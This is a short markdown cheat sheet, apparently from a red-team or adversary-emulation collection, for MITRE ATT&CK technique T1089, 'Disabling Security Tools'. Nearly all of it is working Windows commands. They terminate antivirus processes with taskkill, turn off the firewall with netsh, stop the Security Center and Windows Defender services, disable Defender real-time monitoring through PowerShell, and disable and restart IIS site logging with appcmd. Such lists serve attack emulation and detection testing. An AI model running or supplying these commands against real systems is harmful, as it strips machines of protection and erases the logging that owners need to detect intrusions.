# Disabling Security Tools

MITRE ATT&CK Technique: [T1089](https://attack.mitre.org/wiki/Technique/T1089)

## Terminate Anti-Virus Processes
`Taskkill /F /IM avprocess.exe`

## Disable Firewall
`netsh firewall set opmode disable`

## Stop Windows Security Center
`net stop wscsvc`

## Stop Windows Defender

### Windows 7/8
`net stop windefend`

### Windows 10
`PS > Set-MpPreference -DisableRealtimeMonitoring $true`

## Disable Default Web Site Logging IIS 7

### Disable Default Web Site Logging IIS 7
`%windir%\system32\inetsrv\appcmd.exe set config "Default Web Site" -section:system.webServer/httpLogging /dontLog:"True" /commit:apphost`

### Restart Default Web Site IIS 7
`%windir%\system32\inetsrv\appcmd.exe stop site /site.name:"Default Web Site" && %windir%\system32\inetsrv\appcmd.exe start site /site.name:"Default Web Site"`
